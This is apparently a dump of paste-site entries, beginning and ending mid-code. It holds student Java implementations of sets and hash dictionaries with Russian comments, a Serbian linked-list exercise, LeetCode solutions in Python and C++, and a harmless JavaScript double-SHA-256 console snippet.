                b = b.next; // иначе идём дальше во втором
        }

        if (a == tail || b == B.tail) {
            if (a.val == b.val) {
                RES.tail = new Item(a); // Вставляем первый элемент
                RES.tail.next = RES.tail;
            } return RES;
        }

        RES.tail = new Item(a); // Вставляем первый элемент
        RES.tail.next = RES.tail; //

        a=a.next;
        b=b.next;
        Item r = RES.tail;

        while (a != tail && b != B.tail){ // Вставка пока не дошли до одного из хвостов
            if (a.val == b.val){
                r.insertAfter(new Item(a));
                r = r.next;
                a=a.next;
                b=b.next;
            }
            if (a.val < b.val){ // если в А число меньше идём дальше в первом
                a = a.next;
            } else
                b = b.next; // иначе идём дальше во втором
        }


        if (a == tail && b == B.tail) { // Если дошли до хвостов в обоих множествах, вставляем если совпадают
            if (a.val == b.val) {
                r.insertAfter(new Item(a));
                r = r.next;
            }
            RES.tail = r; // Переставляем хвост в конец
            return RES;
        }

        // Переставляем указатели так чтобы дошли до конца в первом
        Item secTail = B.tail, temp;
        if (b == B.tail) {
            temp = a;
            a = b;
            b = temp;
            secTail = tail;
        }

        while (b != secTail && b.val < a.val) // доходим до неменьшего элемента второго списка (или конца)
            b = b.next;

        if (a.val == b.val) { // если во втором списке элемент равен хвосту второго, вставляем
            r.insertAfter(new Item(b));
            r = r.next;
        }

        RES.tail = r; // Переставляем хвост в конец
        return RES;
    }

    public Set DIFFERENCE(Set B){
        if (B == null || B.tail == null) return new Set(this); // если второй пустой вернуть копию текущего
        if (B == this ||   tail == null) return new Set(start, end); // если указатели совпадают то вернуть пустую копию текущего

        Item a = tail.next; // Указатели для прохода по спискам
        Item Bprev = findPrevItem(B.tail, a.val); // Первый неменьший элемент второго

        if (Bprev.next == B.tail && Bprev.next.val != a.val) // Если во втором todo хвост второго в первом
            return new Set(this);

        Item b = Bprev.next;

        // Создать пустое множество
        Set RES = new Set(start, end);

        while (a.val == b.val && a != tail && b != B.tail){ // Ищем первое непересечение
            a = a.next;
            Bprev = findPrevItem(b, a.val); // Доходим до неменьшего во втором
            b = Bprev.next; // Сдвигаем во втором до найденного
        }

        if (a == tail || b == B.tail) { // Если дошли до конца одного из списков
            if (a.val != b.val) { // Если они элементы не совпадают
                RES.tail = new Item(a); // Вставляем первый элемент
                RES.tail.next = RES.tail;
            } return RES; // Возвращаем либо пустой, либо с одним элементом
        }

        RES.tail = new Item(a); // Вставляем первый элемент
        RES.tail.next = RES.tail; //

        a=a.next;
        Bprev = findPrevItem(b, a.val); // Доходим до неменьшего во втором
        b = Bprev.next; // Сдвигаем во втором до найденного
        Item r = RES.tail;

        while (a != tail && b != B.tail){
            if (a.val == b.val){ // если значения совпадают, идём дальше
                a = a.next;
                Bprev = findPrevItem(b, a.val); // Доходим до неменьшего во втором
                b = Bprev.next; // Сдвигаем во втором до найденного
            }
            else { // Иначе добавляем элемент первого
                r.insertAfter(new Item(a));
                a = a.next;
                r = r.next;
            }
        }

        // Дошли до конца в первом списке (если оба дошли до хвоста то тоже работает)
        if (a == tail){
            if (a.val != b.val){ // если хвост первого списка не находится во втором добавляем его
                r.insertAfter(new Item(a));
                r = r.next;
            }
        } else { // Иначе дошли до конца во втором списке
            while (a != tail) { // Копируем хвост первого списка в результат
                if (b.val != a.val) { // Если хвост второго списка не совпадает с элементом то добавляем этот элемент
                    r.insertAfter(new Item(a));
                    r = r.next;
                }
                a = a.next; // двигаемся дальше в списке
            }
            r.insertAfter(new Item(a)); // Вставка хвоста первого
            r = r.next;
        }
        RES.tail = r; // Перемещаем хвост в конец
        return RES;
    }

    public Set MERGE(Set B){
        // если один из них пустой или указатели совпадают то вернуть копию текущего или другого
        if (B == null || B.tail == null || B == this) return new Set(this);
        // вызываем union
        return union(B);
    }

    public boolean MEMBER(int x){
        // проверка лежит ли х в промежутке
        if (x < start || x > end) return false;
        // вызвать проверку
        return isInSet(x);
    }

    public void MAKENULL(){
        tail = null;
    }

    public void INSERT(int x){
        //проверка что х в границах
        if (x < start || x > end) return;

        //вставка если список пустой
        if (tail == null) {
            tail = new Item(x);
            tail.next = tail;
            return;
        }

        // Если вставка перед головой
        if (tail.next.val > x)
            tail.insertAfter(new Item(x));

        // если элемент вставляется после хвоста
        if (tail.val < x){
            tail.insertAfter(new Item(x));
            tail = tail.next; // Двигаем хвост
        }

        //найти элемент предыдущий потенциальному местонахождению искомого
        Item prev = findPrevItem(tail, x);
        //если искомого элемента нет, вставляем
        if (prev.next.val != x) prev.insertAfter(new Item(x));
        //иначе ничего не делаем
    }

    public void DELETE(int x){
        // проверка что х в границах
        if (x < start || x > end) return;

        // Если искомый элемент должен быть после хвоста или до головы то его нет в списке
        if (tail.val < x || tail.next.val > x) return;

        // если удаляем хвост
        if (tail.val == x){
            if (tail.next == tail) tail = null; // Был один элемент
            else{
                Item prev = findPrevItem(tail, x);
                tail = prev; // Двигаем хвост назад
                prev.deleteAfter();
            }
            return;
        }
        //найти элемент предыдущий потенциальному местонахождению искомого
        Item prev = findPrevItem(tail, x);

        // Если после найденного есть такой элемент
        if (prev.next.val == x) prev.deleteAfter();
        // Иначе ничего не делаем
    }

    public void ASSIGN(Set A){
        // если один и тот же объект или дан пустой
        if (A == null || A == this) return;
        // Скопировать границы
        start = A.start;
        end = A.end;
        // Скопировать элементы
        tail = copylist(A.tail);
    }

    public int MIN(){
        if (tail == null) throw new SetException(""Множество пустое, нет минимального элемента""); // Если список пустой
        return tail.next.val; // Иначе смотрим в голову
    }

    public int MAX(){
        if (tail == null) throw new SetException(""Множество пустое, нет максимального элемента""); // Если список пустой
        return tail.val; // Иначе смотрим в хвост
    }

    public boolean EQUAL(Set B) {// Если границы разные но элементы совпадают то всё равно true
        if (tail.val != B.tail.val) return false; // Если в хвостах различные элементы

        // a, b указатели прохода по спискам
        Item a = tail.next, b = B.tail.next;

        //пока не дойдём до конца хоть одного из списков проверяем что все равны
        while (a != tail && b != B.tail){
            if (a.val != b.val) return false;
            a = a.next;
            b = b.next;
        }
        //если после прохода хоть один из указателей не дошёл до хвоста или они разные вернуть ложь
        if (!(a == tail && b == tail))
            return false;

        return true;
    }

    public Set FIND(Set B, int x){
        // если множества пересекаются бросить исключение
        if (isCrossing(B)) return null;

        // Проверяем на каждом множестве если оно содержит х
        if (start<x && x<end && isInSet(x))
            return this;
        else if (B.start<x && x<B.end && B.isInSet(x))
            return B;

        return null; // Если ни в одном множестве нет этого элемента
    }

    public void PRINT(){
        if (tail == null) return;
         // Проходом по кольцевому списку выводим
        for (Item fir = tail.next; fir != tail; fir = fir.next)
            System.out.printf(""%d "", fir.val);
        System.out.println(tail.val); // Выводим последний
    }
}
"
R6EPUD7f,Untitled,phatboislym,Python,Friday 10th of May 2024 07:16:04 AM CDT,"class Solution:
    def kthSmallestPrimeFraction(self, arr: list[int], k: int) -> list[int]:
        fractions: list = []
        size: int = len(arr)

        for i in range(size):
            for j in range(i + 1, size):
                num: int = arr[i]
                denom: int = arr[j]

                fractions.append([num, denom])

        fractions.sort(key=lambda x: x[0] / x[1])

        return fractions[k - 1]
"
pnQAUXAv,open,Tochoz,Java,Friday 10th of May 2024 07:15:29 AM CDT,"package openhashes;
public class Dict {
    private int CLASS_COUNT = 5; // количество классов в словаре
    private Item a[]; // массив классов, хранит головы связных списков

    private static boolean arraysEqual(char[] a, char[] b){ // Метод проверки массивов на равенство
        if (a == b) return true;

        for (int i=0; i<a.length; i++){
            if (a[i] != b[i]) return false;
            if (a[i] == 0) break;
        }
        return true;
    }

    private static char[] generateCharArray(String s){
        char[] out = new char[10];
        for (int i=0; i<s.length(); i++)
            out[i] = s.charAt(i);
        return out;
    }

    private class Item { // Объект связного списка
        char[] name;
        Item next;

        private static void writeName(char[] from, char[] to){ // Метод берёт массив символов from и записывает в to
            // цикл по массиву и перезаписывание символов из from в to
            for (int i=0; i<10 && from[i] != 0; i++)
                to[i] = from[i];
        }

        public Item(char[] x){
            name = new char[10];
            writeName(x, name);
        }

        private void deleteNext(){ // метод удаляет следующий за текущим элемент
            // указатели на следующий равен указателю следующего элемента
            next = next.next;
        }

    }


    public Dict(){ // Конструктор по умолчанию, выделяет память на массив классов
        a = new Item[CLASS_COUNT];
    }

    public Dict(int n){ // Принимает количество возможных элементов множества (область определения)
        CLASS_COUNT = n/10;
        a = new Item[CLASS_COUNT];
    }

    private Item findPrevforMember(char[] name, Item head) { //!на непустом списке! метод ищет предыдущий элемент перед искомым именем в списке, на вход получает голову списка
        // если элемента нет в списке вернётся хвост (prev.next == null)

        // два указателя fir = head sec = head.next
        Item fir = head, sec = head.next;

        // пока второй не равен искомому или null
        while (sec != null && !arraysEqual(sec.name, name)) {
            fir = sec;
            sec = sec.next;
        }

        return fir;// вернуть первый
    }

    private int computeHash(char[] a){ // метод считает хэш для имени
        int out = 0;
        for (int i=0; a[i]!=0 && i<10; i++)
            out = (out + a[i]) % CLASS_COUNT;
        return out;
    }

    public boolean MEMBER(String x){ // метод проверяет наличие имени в словаре
        char[] name = generateCharArray(x); // Сформировать массив символов
        // определить номер класса вычислив хэш
        int hash = computeHash(name);

        // если список пустой вернуть ложь
        if (a[hash] == null) return false;

        // найти предыдущий элемент в списке нужного класса
        Item prev = findPrevforMember(name, a[hash]);

        return (prev.next != null); // если следующий есть то true
    }

    public void INSERT(String x){ // метод вставляет имя в словарь, если его ещё там нет
        char[] name = generateCharArray(x); // Сформировать массив символов
        // определить номер класса вычислив хэш
        int hash = computeHash(name);

        // если список пустой вставить в голову
        if (a[hash] == null) {
            a[hash] = new Item(name);
            return;
        }

        // проверить наличие в классе (вызвать findPrevforMember на списке нужного класса) если есть, ничего не делаем
        Item prev = findPrevforMember(name, a[hash]);

        if (prev.next != null) return; // если следующий есть то элемент уже в списке

        // если элемента нет, добавить его в голову
        Item temp = a[hash]; // указатель чтобы не потерять голову
        a[hash] = new Item(name);
        a[hash].next = temp;
    }

    public void DELETE(String x){
        char[] name = generateCharArray(x); // Сформировать массив символов

        // определить номер класса вычислив хэш
        int hash = computeHash(name);

        // если список пустой ничего не делать
        if (a[hash] == null) return;

        // Если в списке имя находится в голове, удаляем его
        if (arraysEqual(a[hash].name, name)) {
            a[hash] = a[hash].next;
            return;
        }

        // найти предыдущий элемент перед искомым
        Item prev = findPrevforMember(name, a[hash]);

        if (prev.next != null) prev.deleteNext(); // если следующий есть то удаляем
    }

    public void MAKENULL(){
        for (int i=0; i<CLASS_COUNT; i++)
            a[i] = null;
    }

    public void PRINT(){
        for (int i=0; i<CLASS_COUNT; i++){
            if (a[i] != null) {
                System.out.print(a[i].name);
                System.out.print("" "");
                Item el = a[i].next;
                while (el != null) {
                    System.out.print(el.name);
                    System.out.print("" "");
                    el = el.next;
                }
            }
        }
        System.out.println();
    }
}
"
QyEvbivQ,Close,Tochoz,Java,Friday 10th of May 2024 07:15:02 AM CDT,"package closehashes;
public class Dict {
    private int CAPACITY = 10; // количество классов в словаре
    private char[][] a; // массив символьных массивов имён

    private static boolean arraysEqual(char[] a, char[] b) { // Метод проверки массивов на равенство
        if (a == b) return true;

        for (int i = 0; i < a.length; i++) {
            if (a[i] != b[i]) return false;
            if (a[i] == 0) break;
        }
        return true;
    }

    private static char[] generateCharArray(String s){
        char[] out = new char[10];
        for (int i=0; i<out.length; i++)
            out[i] = s.charAt(i);
        return out;
    }

    public Dict() { // Конструктор по умолчанию, выделяет память на массив классов
        a = new char[CAPACITY][];
    }

    public Dict(int n) { // Принимает количество возможных элементов множества (область определения)
        CAPACITY = n;
        a = new char[CAPACITY][];
    }

    private int computeHash(char[] a) { //  todo метод считает значение хэша
        int out = 0;
        for (int i = 0; a[i] != 0 && i < 10; i++)
            out += a[i];
        return out;
    }

    private int repeatHash(int hash, int i) { // метод считает повторный хэш для существующего хэша i -- номер повторного хэширования
        return (hash + i) % CAPACITY;
    } // todo функция хэширования

    private int find(char[] name){ // метод ищет имя в массиве и возвращает индекс, если его нет, возвращает -1
        // посчитать хэш
        int hash = computeHash(name);

        int i=0; // Номер повторения
        int startInd = repeatHash(hash, i++);
        // проверить на равенство имени если элемент пустой, вернуть -1
        if (a[startInd] == null) return -1;
        // Если нашли совпадение возвращаем индекс найденного имени
        if (arraysEqual(name, a[startInd])) return startInd;

        // создать переменную повторного хэша
        int nextInd=repeatHash(hash, i++);

        // Цикл повторных хэширований пока не вернулись в ту же позицию или не наткнулись на пустой
        while (a[nextInd] != null && nextInd != startInd) {
            if (arraysEqual(name, a[nextInd])) return nextInd; // если нашли, возвращаем позицию
            nextInd = repeatHash(hash, i++); // пересчитываем хэш
        }

        return -1; // если не нашли то элемента нет
    }



    public boolean MEMBER(String x) { // метод проверяет наличие имени в словаре
        char[] name = generateCharArray(x); // Сформировать массив символов
        //найти имя через find
        int ind = find(name);

        return (ind != -1); // Если вернулся не -1, то имя есть в словаре
    }

    public void INSERT(String x) { // метод вставляет имя в словарь, если его ещё там нет
        char[] name = generateCharArray(x); // Сформировать массив символов

        // посчитать хэш
        int hash = computeHash(name);

        int i=0; // Номер повторения
        int startInd = repeatHash(hash, i++);
        // проверить на равенство имени если элемент пустой, вернуть -1
        if (a[startInd] == null) {
            a[startInd] = name;
            return;
        }
        if (arraysEqual(name, a[startInd])) return ;

        // создать переменную повторного хэша
        int nextInd=repeatHash(hash, i++);
        int first_deleted = -1; // Переменная запоминающая индекс первого найденного удалённого
        if (a[startInd][0] == 0) first_deleted = startInd; // если в первом элементе удалённое имя, сразу запоминаем

        while (a[nextInd] != null && nextInd != startInd) { // Цикл повторных хэширований пока не вернулись в тот же хэш или не наткнулись на пустой
            if (arraysEqual(name, a[nextInd])) return; // если нашли выходим

            // если не был найден ещё удалённый и нашли такой запоминаем
            if (first_deleted == -1 && a[nextInd][0] == 0) first_deleted = nextInd;

            nextInd = repeatHash(hash, i++); // пересчитываем хэш
        }

        if (nextInd == startInd) throw new MyException(""Словарь заполнен""); // если мы вернулись к тому же хешу, словарь заполнен

        a[(first_deleted == -1)? nextInd: first_deleted] = name; // вставляем имя в удалённый, если он был, иначе туда, куда пришли
    }

    public void DELETE(String x) { // почему бы при проходе для удаления не искать предыдущий а поменять контенты со следующим и удалить следующий
        char[] name = generateCharArray(x); // Сформировать массив символов
        //найти имя через find
        int ind = find(name);

        if (ind == -1) return; // если индекс -1 то такого элемента нет, ничего не делаем

        //записываем в начало символьного массива терминальный символ
        a[ind][0] = 0;
    }

    public void MAKENULL() { // Зануление голов связных списков
        for (int i = 0; i < CAPACITY; i++)
            a[i] = null;
    }

    public void PRINT(){
        for (int i=0; i<CAPACITY; i++){
            if (a[i] != null && a[i][0] != 0) {
                System.out.print(a[i]);
                System.out.print("" "");
            }
        }
        System.out.println();
    }
}"
a6XteJkQ,bitmask,Tochoz,Java,Friday 10th of May 2024 07:14:27 AM CDT,"package bitmask;

public class Set {
    private int start, end;
    private int[] bits;

    public Set(int start, int end){
        // если start > end то переставить местами
        if (start > end){
            this.end = start;
            this.start = end;
        } else {
            this.start = start;
            this.end = end;
        }

        // определение числа в котором будет находиться первый и последний бит
        int startEl = getElementNum(this.start), endEl = getElementNum(this.end);

        // определение длины отрезка от startEl до endEl и выделение такого количества чисел в массиве (endEl-startEl+1)
        bits = new int[endEl-startEl+1];
    }

    public Set(Set B){
        start = B.start;
        end = B.end;
        bits = getarraycopy(B.bits);
    }
    // Закрытый конструктор выделяет память под массив и копирует элементы полученного множества
    private Set(int start, int end, Set set){ // todo добавил
        this.start = start;
        this.end = end;

        // Выделение памяти под массив чисел
        int startEl = getElementNum(this.start), endEl = getElementNum(this.end);
        bits = new int[endEl-startEl+1];

        // смещение элемента где в текущем массиве начинается переданное множество
        int offset = getElementNum(set.start) - startEl;

        // копирование значений из array со сдвигом на offset
        for (int i=0; i<set.bits.length; i++)
            bits[i+offset] = set.bits[i];
    }

    private static int[] getarraycopy(int[] a){ //Метод возвращает копию массива
        int[] out = new int[a.length];

        for (int i=0; i<a.length; i++)
            out[i] = a[i];

        return out;
    }

    private int getElementNum(int x){ // определение номера битового поля в котором будет находиться бит числа х (-64; -33) -> -2 (-32; -1
        if (x>=0) return x/32; //т.к. в каждом числе 32 бита
        return -((-x-1)/32)-1; // Если отрицательный то смещается на 1 в большую сторону
    }

    public int getInMaskPos(int x){
        return (x<0? 32-((-x-1)%32)-1: x%32);
    }

    private boolean isInSet(int x){ // проверка находится ли бит во множестве
        // вычисления номера первого числа в массиве getElementNum(start)
        // вычисление индекса числа в массиве где должен находиться х getElementNum(x) - getElementNum(start)
        return isInMask(getElementNum(x) - getElementNum(start), getInMaskPos(x)); // отбрасываем минус у отрицательного числа
    }

    private boolean isInMask(int ind, int x){ // метод проверяет является ли бит на х месте единицей в элементе ind массива
        // побитовое и числа из массива с 1 << (31-x%32) смещаем 1 на n=x%32 бит справа
        return (bits[ind] & (1 << (31-x))) != 0;
        // если число не ноль то x есть в множестве.
    }

    public boolean isCrossing(Set B){ // Доп метод проверяет пересекаются множества или нет
        if (start > B.end || B.start > end) // случай когда она не пересекаются по границам они либо пустые, тогда не пересекаются либо не пустые и тогда не пересекаются
            return false;

        if (B == this) {
            return true; // Если ссылки одинаковые то пересекаются
        }

        //Нахождение позиций начала и конца каждого из множеств
        int AStartEl = getElementNum(start), BStartEl = getElementNum(B.start), AEndEl = getElementNum(end), BEndEl = getElementNum(B.end);

        // определение числа в котором будет находиться первый и последний бит
        int startP = (AStartEl > BStartEl)? AStartEl: BStartEl; // Максимальная позиция начала
        int endP = (AEndEl < BEndEl)? AEndEl: BEndEl; // Минимальная позиция конца

        for (int p = startP; p<=endP; p++) // Проход по числам пересечения и их побитовое И
            if ((bits[p - AStartEl] & B.bits[p - BStartEl]) != 0) return true; // если побитовое И не нулевое то есть перечесение вернуть истину

        return false; // если дошли до конца вернуть ложь
    }

    private Set union(Set B){ // Закрытый метод выполняет объединение todo сделать на копировании первого и добавление второго

        int startRES = (start < B.start)? start: B.start; // Старт результирующего множества
        int endRES = (end > B.end)? end: B.end; // Конец результирующего множества

        // Создание копии первого множества с объединёнными границами и копией значений текущего массива со сдвигом
        Set RES = new Set(startRES, endRES, this);

        //Нахождение позиций начала и конца второго множества
        int BStartEl = getElementNum(B.start), BEndEl = getElementNum(B.end);
        int RESStartEl = getElementNum(startRES); // Позиция начала результирующего множества

        // Добавление в множество элементов второго множества на нужные места
        for (int el = BStartEl; el <= BEndEl; el++)
            RES.bits[el - RESStartEl] |= B.bits[el - BStartEl];

        return RES;
    }

    public Set UNION(Set B){
        // если один из них пустой или указатели совпадают то вернуть копию текущего или другого
        if (B == null || B == this) return new Set(this);
        // вызываем union
        return union(B);
    }

    public Set INTERSECTION(Set B) {
        if (B == this) return new Set(this); // Если это одни и те же указатели
        //проверка пересекаются ли множества если нет или B пустое вернуть пустую копию текущего множества
        if (B == null || !isCrossing(B)) return new Set(start, end);
        //A и B Ссылки на множества, если надо, переставить так чтобы A.start <= B.start
        Set A = this;
        if (A.start>B.start){ // если второе начинается раньше, перетсавляем
            A=B; B=this;
        }
        //создание нового множества с пересечением границ RES = new Set(...)
        Set RES = new Set(B.start, A.end);

        //Нахождение позиций нулей и концов каждого из множеств --> AStartEl BStartEl AEndEl BEndEl
        int AStartEl = getElementNum(A.start), BStartEl = getElementNum(B.start), AEndEl = getElementNum(A.end), BEndEl = getElementNum(B.end);
        int endP = (AEndEl < BEndEl)? AEndEl: BEndEl; // Минимальная позиция конца

        // Применяем побитовое и для чисел на позициях начиная с BStartEl заканчивая BEndEl
        for (int pos = BStartEl; pos <= endP; pos++)
            RES.bits[pos - BStartEl] = A.bits[pos-AStartEl] & B.bits[pos-BStartEl];

        return RES;
    }

    public Set DIFFERENCE(Set B){
        if (B == this) return new Set(start, end); // Если это одни и те же указатели то будет пустое множество с теми же границами
        //Если B пустое вернуть копию текущего множества
        if (B == null) return new Set(this);

        Set RES = new Set(this); // Формируем множество на основе текущего

        //Нахождение позиций начала и конца каждого из множеств
        int AStartEl = getElementNum(start), BStartEl = getElementNum(B.start), AEndEl = getElementNum(end), BEndEl = getElementNum(B.end);

        // определение позиций начала и конца пересечений
        int startP = (AStartEl > BStartEl)? AStartEl: BStartEl; // Максимальная позиция начала
        int endP = (AEndEl < BEndEl)? AEndEl: BEndEl; // Минимальная позиция конца


        for (int p = startP; p<=endP; p++) // Проход по числам пересечения и их побитовое вычитание Если границы не пересекаются то ничего не будет
            RES.bits[p - AStartEl] &= ~B.bits[p - BStartEl];

        return RES;
    }

    public Set MERGE(Set B){
        // если один из них пустой или указатели совпадают то вернуть копию текущего или другого
        if (B == null || B == this) return new Set(this);
        // вызываем union
        return union(B);
    }

    public boolean MEMBER(int x){ // Метод проверяет наличие
        // если х не находится в области определения вернуть ложь
        if (start>x || x>end) return false;
        // вызвать isInSet
        return isInSet(x);
    }

    public void MAKENULL(){
        // проход по массиву и зануление всех чисел
        for (int i=0; i<bits.length; i++)
            bits[i]=0;
    }

    public void INSERT(int x){
        //проверка что х в границах
        if (start>x || x>end) return;
        //Вычислить offset номер первого элемента массива вычислить в каком числе будет х
        int AStartEl = getElementNum(start), xEl = getElementNum(x);
        //побитовое или элемента массива[xEl-AStartEl] и 1 << (31-x%32)
        bits[xEl-AStartEl] |= 1 << (31-x%32);

    }

    public void DELETE(int x){
        //проверка что х в границах
        if (start>x || x>end) return;
        //Вычислить offset номер первого элемента массива вычислить в каком числе будет х
        int AStartEl = getElementNum(start), xEl = getElementNum(x);
        //побитовое и элемента массива[xEl-AStartEl] c -(1 << (31-x%32))
        bits[xEl-AStartEl] &= ~(1 << (31-x%32));
    }

    public void ASSIGN(Set B){
        // проверить ссылки различные
        if (this == B) return;
        // заменить границы
        start = B.start; end = B.end;
        // если массивы одной длинны то просто скопировать
        if (bits.length == B.bits.length)
            for (int i=0; i<bits.length; i++)
                bits[i] = B.bits[i];
        else
            // иначе создать новый массив
            bits = getarraycopy(B.bits);
    }

    public int MIN(){ // возвращает минимальный элемент содержащийся во множестве
        // пока элемент массива нулевой, дальше
        int i=0;
        while (i < bits.length && bits[i] == 0)
            i++;

        // Если прошли весь массив то в массиве нет элементов и выводим end+1
        if (i == bits.length) throw new SetException(""Множество пустое, нет минимального элемента"");

        int x=(i==0? getInMaskPos(start): 0);// если первый элемент ненулевой то начинаем проверку с start%32 бита
        int lastbit = (i+1==bits.length? getInMaskPos(end): 31); // если в последнем числе массива то идём до end


        // идём по битам пока они нулевые (число при этом точно не нулевое)
        while (!isInMask(i,x))
            x++;


        return (getElementNum(start)+i)*32+x; // вернуть хранимое число
    }
    public int MAX() { // аналогично MIN но с обратной стороны
        // пока элемент массива нулевой, дальше
        int i=bits.length-1;
        while (i >= 0 && bits[i] == 0)
            i--;

        // Если прошли весь массив то в массиве нет элементов и выводим start-1
        if (i == -1) throw new SetException(""Множество пустое, нет максимального элемента"");

        int firstbit=(i==0? getInMaskPos(start): 0);// если первый элемент ненулевой то начинаем проверку до start%32 бита
        int x = (i+1==bits.length? getInMaskPos(end): 31); // если в последнем числе массива то идём до end


        // идём по битам пока не дошли до конца и они нулевые
        while (x >= firstbit && !isInMask(i,x))
            x--;

        return (getElementNum(start)+i)*32+x; // вернуть хранимое число
    }

    public boolean EQUAL(Set B) {// Если границы разные но элементы совпадают то всё равно true
        if (this == B) return true; // Если ссылка на одно и то же множество

        //A и B Ссылки на множества, если надо, переставить так чтобы A.start <= B.start
        Set A = this;
        if (A.start>B.start){
            A=B; B=this;
        }

        //Нахождение позиций начала и конца каждого из множеств
        int AStartEl = getElementNum(A.start), BStartEl = getElementNum(B.start), AEndEl = getElementNum(A.end), BEndEl = getElementNum(B.end);
        int Aind = AStartEl, Bind = BStartEl; //индексы для прохода массивах множеств А и В

        //1) Все ли элементы до пересечения нулевые
        while (Aind < AEndEl && Aind != Bind)
            if (bits[Aind++ - AStartEl] != 0)
                return false;

        //2) Проверка все ли элементы пересечения совпадают, если нашли несовпадение false
        if (Aind == Bind) // Есть пересечение
            while (Aind < AEndEl && Bind < BEndEl) // Пока один из массивов не закончится
                if (A.bits[Aind++ - AStartEl] != B.bits[Bind++ - BStartEl])
                    return false;

        //3) Проверка оставшегося хвоста на пустоту
        while (Aind <= AEndEl)//то конец первого множества остался
            if (bits[Aind++ - AStartEl] != 0)
                return false;
        while (Bind <= BEndEl) // конец второго множества остался
            if (bits[Bind++ - BStartEl] != 0)
                return false;

        return true;

    }
    public Set FIND(Set B, int x){ // ВСЁ НОРМАЛЬНО ТУТ
        // Проверяем на каждом множестве если оно содержит х
        if (start<x && x<end && isInSet(x))
            return this;
        else if (B.start<x && x<B.end && B.isInSet(x))
            return B;

        return null; // Если ни в одном множестве нет этого элемента

    }

    public void PRINT(){

        for (int i=start; i<=end; i++) // Проход по всем возможным элементам множестве с проверкой есть ли они в нём
            if (isInSet(i)) System.out.printf(""%d "", i);
        System.out.println();
    }

    public void DEBUG_PRINT(){
        StringBuilder out = new StringBuilder(bits.length*33);
        for (int i=0; i< bits.length; i++) {

            for (int j=0; j<32; j++) {
                if ((bits[i] & 1<<(31-j)) == 0)
                    out.append('0');
                else
                    out.append('1');

            }
            out.append(' ');
        }
        System.out.println(out);
    }

}
"
RawDwn2Y,Dodatni - ListeListi,niske,Java,Friday 10th of May 2024 07:11:10 AM CDT,"public class Dodatni{
	
	public static void main (String[] args) {
		RacunarskeUcionice pmf = new RacunarskeUcionice();
		
		pmf.dodajUcionicu(""Crvena"");
			pmf.dodajOpremu(""Racunar"", ""LG"", 1);
			pmf.dodajOpremu(""Racunar"", ""Dell"", 1);
			pmf.dodajOpremu(""Drveno"", ""Sto"", 1);
		pmf.dodajUcionicu(""Plava"");
			pmf.dodajOpremu(""Racunar"", ""LG"", 2);
			pmf.dodajOpremu(""Racunar"", ""Dell"", 2);
		pmf.dodajUcionicu(""Crvena"");
			pmf.dodajOpremu(""Drveno"", ""Sto"", 3);
		
		System.out.println(pmf);
		
	}
}	
	class RacunarskeUcionice{
		//Ucionica
		class Ucionica{
			String boja;
			Oprema prvaOprema;
			Ucionica veza;
			
			public Ucionica(String boja){
				this.boja = boja;
				this.prvaOprema = null;
				this.veza = null;
			}
			
			public String toString(){
				String s = ""Boja: "" + boja;
				Oprema tek = prvaOprema;
				while(tek != null){
					s += ""\n"" + tek;
					tek = tek.veza;
				}
				
				return s;
			}
		}
		
		//Oprema
		class Oprema{
			String tip;
			String opis;
			Oprema veza;
			
			public Oprema(String tip, String opis){
				this.tip = tip;
				this.opis = opis;
				this.veza = null;
			}
			
			public String toString(){
				return tip + "": "" + opis;
			}
		}
		
		Ucionica prvaUcionica = null;
		
		//Metode
		
		public void dodajUcionicu(String boja){
			if(prvaUcionica == null){
				prvaUcionica = new Ucionica(boja);
			} else {
				Ucionica tek = prvaUcionica;
				while(tek.veza != null)
					tek = tek.veza;
				
				Ucionica novi = new Ucionica(boja);
				tek.veza = novi;
			}
		}
		
		public int brojUcionica(){
			Ucionica tek = prvaUcionica;
			int brojac = 0;
			while(tek != null){
				tek = tek.veza;
				brojac++;
			}
			
			return brojac;
		}
		
		
		public void dodajOpremu(String tip, String opis, int brUcionice){
			if (brUcionice < 1 || brojUcionica() < brUcionice){
				return;
			}
			
			Oprema nova = new Oprema(tip, opis);
			Ucionica tek = prvaUcionica;
			
			for (int i = 1; i < brUcionice; i++){
				tek = tek.veza;
			}
			
			Oprema tren = tek.prvaOprema;
			tek.prvaOprema = nova;
			nova.veza = tren;
			
			
		}
		
		
		public String toString(){
			int brojac = 1;
			Ucionica tek = prvaUcionica;
			String s = ""Spisak ucionica:\n"";
			while(tek != null){
				s+= ""\nUcionica "" + brojac + "":\n"" + tek + ""\n"";
				tek = tek.veza;
				brojac++;
			}
			
			return s;
		}
		
		
		
		
		
	}
	
	
	


"
7v1tuAWG,util-ref-edited-double-sha256,benjaminvr,JavaScript,Friday 10th of May 2024 07:09:38 AM CDT,"// https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/digest#converting_a_digest_to_a_hex_string
// The function from MDN has been modified to provide a double sha256

/*
	Open a new browser tab or window and paste the following in your developer console (CTRL + SHIFT + I)
    
    (You may need to type ""allow pasting"", as indicated by your browser)
*/

const text =
  ""An obscure body in the S-K System, your majesty. The inhabitants refer to it as the planet Earth."";

async function provideSha256ByteArray(message) {
  const msgUint8 = new TextEncoder().encode(message); 
  const hashBuffer = await crypto.subtle.digest(""SHA-256"", msgUint8); 
  return new Uint8Array(hashBuffer);
  
}

async function provideDoubleSha256(message){
	const sha256ByteArray = await provideSha256ByteArray(message);
    const hashBuffer = await crypto.subtle.digest(""SHA-256"", sha256ByteArray);
    const hashBufferByteArray = new Uint8Array(hashBuffer);
    const hashArray = Array.from(hashBufferByteArray);
    
    const hashHex = hashArray
    .map((b) => b.toString(16).padStart(2, ""0""))
    .join(""""); 
  	
    return hashHex;
}

/*
	Get the double sha256 hash for any string, in this case the string assigned to the text variable
*/

const result = await provideDoubleSha256(text);

/*
	The result is ""255c3a66cd15953821c8c3a04dc22d10a826209a705d13f8072f674c2bf3294c"" 
    
    Repeat this with any other string
*/
"
qyjSkuXT,Path Sum III,jayati,C++,Friday 10th of May 2024 06:56:40 AM CDT,"/**
 * Definition for a binary tree node.
 * struct TreeNode {
 *     int val;
 *     TreeNode *left;
 *     TreeNode *right;
 *     TreeNode() : val(0), left(nullptr), right(nullptr) {}
 *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}
 *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}
 * };
 */
class Solution {
public:
    int ans=0;
    int pathSum(TreeNode* root, int targetSum) {
        if(root)
        {
            dfs(root,targetSum);
            pathSum(root->left,targetSum);
            pathSum(root->right,targetSum);
        }
        return ans;
    }
    void dfs(TreeNode* root,long long sum)
    {
        if(!root)
        {
            return;
        }
        if(root->val==sum)
        {
            ans++;
        }
